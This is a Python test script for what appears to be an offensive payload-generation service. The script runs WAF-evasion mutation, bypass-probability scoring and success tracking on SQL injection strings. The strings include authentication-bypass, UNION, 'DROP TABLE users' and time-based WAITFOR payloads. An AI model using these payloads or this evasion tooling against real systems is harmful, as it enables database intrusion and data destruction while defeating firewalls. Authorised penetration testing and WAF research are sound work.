#!/usr/bin/env python3
"""
Test script for enhanced payload generation
Demonstrates mutation + scoring capabilities
"""

import logging
import json
from payload_service import PayloadService
from payload_scorer import PayloadMetrics

logging.basicConfig(
    level=logging.INFO,
    format='%(message)s'
)
logger = logging.getLogger(__name__)


def print_section(title):
    """Print a formatted section header"""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)


def test_mutations():
    """Test payload mutation system"""
    print_section("TEST 1: WAF Evasion Mutations")
    
    service = PayloadService()
    
    sql_payloads = [
        "' OR '1'='1' --",
        "UNION SELECT NULL,NULL,NULL --",
        "'; DROP TABLE users; --"
    ]
    
    for payload in sql_payloads:
        print(f"\nOriginal Payload:")
        print(f"  {payload}\n")
        
        mutations = service.get_mutated_payloads(
            payload,
            technology='php',
            target_waf='modsecurity',
            max_mutations=5
        )
        
        print(f"Generated {len(mutations)} WAF-evasion variants:\n")
        for i, (variant, prob) in enumerate(mutations, 1):
            print(f"  {i}. Bypass Probability: {prob:.0%}")
            print(f"     {variant[:70]}")
            if len(variant) > 70:
                print(f"     ...")


def test_scoring():
    """Test confidence scoring system"""
    print_section("TEST 2: Confidence Scoring")
    
    service = PayloadService()
    
    # Create test payloads with different characteristics
    payloads_data = [
        {
            'payload': "' OR '1'='1' --",
            'name': 'Classic SQLi',
            'cve': 'CVE-2023-1234',
            'severity': 'High',
            'cvss': 8.5,
            'successes': 17,
            'attempts': 20,
            'freq': 50
        },
        {
            'payload': "UNION SELECT NULL--",
            'name': 'Union-Based',
            'cve': 'CVE-2023-5678',
            'severity': 'Medium',
            'cvss': 6.5,
            'successes': 6,
            'attempts': 10,
            'freq': 20
        },
        {
            'payload': "; DROP TABLE users--",
            'name': 'Stacked Queries',
            'cve': None,
            'severity': 'Critical',
            'cvss': 9.5,
            'successes': 2,
            'attempts': 3,
            'freq': 5
        }
    ]
    
    metrics_list = []
    for p in payloads_data:
        metrics = PayloadMetrics(
            payload=p['payload'],
            exploit_type='sql_injection',
            cve_id=p['cve'],
            cve_severity=p['severity'],
            cvss_score=p['cvss'],
            successful_executions=p['successes'],
            execution_count=p['attempts'],
            target_technologies=['PHP', 'MySQL'],
            use_frequency=p['freq'],
            source='learned'
        )
        metrics_list.append(metrics)
    
    # Score them
    scored = service.scorer.score_payloads(
        metrics_list,
        target_technologies=['PHP', 'MySQL'],
        sort=True
    )
    
    print("\nPayloads Ranked by Confidence Score:\n")
    for i, sp in enumerate(scored, 1):
        print(f"  RANK {i}: Score {sp.final_score:.3f}")
        print(f"          {sp.metrics.payload}")
        print(f"          CVE: {sp.metrics.cve_id or 'N/A'}")
        print(f"          Success: {sp.metrics.successful_executions}/{sp.metrics.execution_count}")
        print()


def test_intelligent_payloads():
    """Test integrated intelligent payload generation"""
    print_section("TEST 3: Intelligent Payload Generation (Mutations + Scoring)")
    
    service = PayloadService()
    
    target_info = {
        'technology': 'PHP',
        'vulnerability': 'sql_injection',
        'waf': 'modsecurity',
        'technologies': ['PHP', 'MySQL', 'Apache']
    }
    
    print(f"\nTarget Environment:")
    print(f"  Technology: {target_info['technology']}")
    print(f"  Technologies: {', '.join(target_info['technologies'])}")
    print(f"  WAF: {target_info['waf']}")
    print(f"  Vulnerability: {target_info['vulnerability']}\n")
    
    payloads = service.get_intelligent_payloads(
        target_info,
        apply_mutations=True,
        apply_scoring=True,
        max_payloads=3
    )
    
    for i, p_dict in enumerate(payloads, 1):
        print(f"\nPayload #{i}")
        print(f"  Confidence Score: {p_dict['confidence_score']:.3f} ", end="")
        
        # Score interpretation
        score = p_dict['confidence_score']
        if score >= 0.8:
            print("(Excellent)")
        elif score >= 0.7:
            print("(Very Good)")
        elif score >= 0.6:
            print("(Good)")
        else:
            print("(Fair)")
        
        print(f"  Base Payload: {p_dict['payload']}")
        
        if p_dict['mutations']:
            print(f"  WAF-Evasion Variants ({len(p_dict['mutations'])}):")
            for j, mut in enumerate(p_dict['mutations'][:3], 1):
                print(f"    {j}. Bypass: {mut['bypass_probability']:.0%}")
                print(f"       {mut['variant'][:65]}")


def test_execution_tracking():
    """Test execution tracking and statistics"""
    print_section("TEST 4: Execution Tracking & Learning")
    
    service = PayloadService()
    
    # Simulate executions
    test_cases = [
        ("' OR '1'='1' --", True),
        ("' OR '1'='1' --", True),
        ("' OR '1'='1' --", False),
        ("UNION SELECT NULL--", True),
        ("UNION SELECT NULL--", False),
        ("UNION SELECT NULL--", False),
    ]
    
    print(f"\nSimulating {len(test_cases)} payload executions...\n")
    
    for payload, success in test_cases:
        service.track_payload_execution(
            payload,
            'sql_injection',
            success,
            target_technologies=['PHP', 'MySQL'],
            waf_name='modsecurity'
        )
        status = "[OK]" if success else "[FAIL]"
        print(f"  {status} {payload[:40]}...")
    
    # Get statistics
    stats = service.get_payload_statistics()
    
    print(f"\n\nStatistics:")
    print(f"  Tracked Payloads: {stats['tracked_payloads']}")
    print(f"  Total Executions: {stats['total_executions']}")
    print(f"  Successful: {stats['total_successes']}")
    print(f"  Failed: {stats['total_executions'] - stats['total_successes']}")
    print(f"  Overall Success Rate: {stats['overall_success_rate']:.1%}")
    print(f"  Average Success Rate: {stats['average_success_rate']:.1%}")
    
    print(f"\nMost Used Payloads:")
    for j, metrics in enumerate(stats['most_used_payloads'][:3], 1):
        success_rate = (
            metrics.successful_executions / max(metrics.execution_count, 1)
        )
        print(f"  {j}. {metrics.payload[:40]}")
        print(f"     Uses: {metrics.use_frequency} | Success: {success_rate:.0%}")


def test_comparison():
    """Test payload comparison"""
    print_section("TEST 5: Payload Comparison")
    
    service = PayloadService()
    
    m1 = PayloadMetrics(
        payload="' OR '1'='1' --",
        exploit_type='sql_injection',
        cve_severity='High',
        cvss_score=8.5,
        successful_executions=17,
        execution_count=20,
        target_technologies=['PHP', 'MySQL'],
        source='learned'
    )
    
    m2 = PayloadMetrics(
        payload="'; WAITFOR DELAY '00:00:05'--",
        exploit_type='time_based_sqli',
        cve_severity='Medium',
        cvss_score=6.5,
        successful_executions=8,
        execution_count=12,
        target_technologies=['SQL Server'],
        source='web_scraped'
    )
    
    comparison = service.scorer.compare_payloads(m1, m2)
    
    print(f"\nComparing Two Payloads:\n")
    print(f"Payload 1: {m1.payload}")
    print(f"  Score: {comparison['payload1']['score']:.3f}")
    
    print(f"\nPayload 2: {m2.payload}")
    print(f"  Score: {comparison['payload2']['score']:.3f}")
    
    print(f"\nWinner: {comparison['winner']}")
    print(f"Score Difference: {comparison['score_difference']:.3f}")


def test_mutation_types():
    """Test different mutation strategies"""
    print_section("TEST 6: Mutation Strategy Comparison")
    
    service = PayloadService()
    payload = "SELECT * FROM users"
    
    print(f"\nOriginal: {payload}\n")
    print("Mutation Strategies:\n")
    
    mutations = service.get_mutated_payloads(
        payload,
        technology='php',
        max_mutations=14
    )
    
    for mut, prob in mutations:
        print(f"Bypass: {prob:.0%}")
        print(f"  {mut[:70]}")
        print()


def main():
    """Run all tests"""
    print("\n")
    print("+" + "=" * 78 + "+")
    print("|" + " " * 78 + "|")
    print("|" + "  Enhanced Payload Generation - Comprehensive Test Suite".center(78) + "|")
    print("|" + " " * 78 + "|")
    print("+" + "=" * 78 + "+")
    
    try:
        test_mutations()
        test_scoring()
        test_intelligent_payloads()
        test_execution_tracking()
        test_comparison()
        test_mutation_types()
        
        print_section("ALL TESTS COMPLETED SUCCESSFULLY")
        print("\n[OK] Mutation engine working")
        print("[OK] Scoring system working")
        print("[OK] Intelligent payload generation working")
        print("[OK] Execution tracking working")
        print("[OK] Payload comparison working")
        print("[OK] Mutation strategies working\n")
        
    except Exception as e:
        print(f"\n[ERROR] Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == "__main__":
    exit(main())
